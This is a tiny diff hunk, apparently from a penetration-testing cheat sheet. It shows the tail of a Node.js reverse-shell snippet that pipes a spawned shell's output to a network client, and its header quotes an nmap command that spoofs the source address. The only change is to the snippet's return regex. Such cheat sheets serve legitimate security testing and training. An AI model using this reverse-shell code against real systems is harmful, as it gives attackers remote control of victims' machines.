@@ -2947,7 +2947,7 @@ nmap -S spoof_IP_here target_IP_here
     sh.stdout.pipe(client);
     sh.stderr.pipe(client);
   });
-  return /a/;
+  return /check your listener/;
 })();
 ```
 
